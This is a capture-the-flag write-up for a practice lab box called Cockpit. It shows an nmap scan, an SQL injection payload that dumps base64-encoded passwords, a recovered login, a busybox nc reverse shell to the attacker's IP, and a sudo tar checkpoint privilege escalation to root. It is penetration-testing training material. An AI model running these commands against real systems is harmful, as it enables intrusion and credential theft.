---
icon: ubuntu
---

# Cockpit - Intermediate

## Gaining Access

Nmap scan:

```
nmap -A -T4 -p- -Pn 192.168.118.10 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 14:46 EDT
Nmap scan report for 192.168.118.10
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.118.10:9090/
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   29.55 ms 192.168.45.1
2   29.52 ms 192.168.45.254
3   29.72 ms 192.168.251.1
4   29.84 ms 192.168.118.10
```

## HTTP Port 80

The main page looks like a static page, I am going to do some directory busting see If I can find something:

```
dirsearch -u http://192.168.118.10/
```

<figure><img src="../../.gitbook/assets/image (1469).png" alt=""><figcaption></figcaption></figure>

There is a login.php!

<figure><img src="../../.gitbook/assets/image (1470).png" alt=""><figcaption></figcaption></figure>

looks like we got a username and a domain name in the footer. I am going to update my /etc/hosts file

```
192.168.118.10 	blaze.offsec
```

### SQLI Login Form

Trying a SQL injection on the login form I got faced with this page:

<figure><img src="../../.gitbook/assets/image (1471).png" alt=""><figcaption></figcaption></figure>

placing a simple ' shows us that there is SQLI in this login form!

<figure><img src="../../.gitbook/assets/image (1472).png" alt=""><figcaption></figcaption></figure>

```
'OR 1 OR'
```

Trying the above SQLI command in the username and password failed we actually dumped 2 usernames and hashes

<figure><img src="../../.gitbook/assets/image (1473).png" alt=""><figcaption></figcaption></figure>

Taking a closer look those do not look like hashes, they look like base64 encoded passwords. I am going to try to decode them

<figure><img src="../../.gitbook/assets/image (1474).png" alt=""><figcaption></figcaption></figure>

I am going to try these creds on port 9090&#x20;

### HTTP Port 9090

```
james:canttouchhhthiss@455152
```

James's credentials work on the login form!

<figure><img src="../../.gitbook/assets/image (1475).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1477).png" alt=""><figcaption></figcaption></figure>

There is a terminal! Not only that but we can see a priv esc as well thanks to sudo -l tar wildcard! First let's get a proper shell on our attack machine

nc is on the machine I am going to use it to get a reverse shell&#x20;

```
busybox nc 192.168.45.158 9090 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1479).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1480).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

<figure><img src="../../.gitbook/assets/image (1482).png" alt=""><figcaption></figcaption></figure>

### Sudo Tar wildcard exploit

[**gtfobins**](https://gtfobins.github.io/gtfobins/tar/#sudo)

<figure><img src="../../.gitbook/assets/image (1481).png" alt=""><figcaption></figcaption></figure>

```
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<figure><img src="../../.gitbook/assets/image (1483).png" alt=""><figcaption></figcaption></figure>

This box was really nice and easy! I really enjoyed it
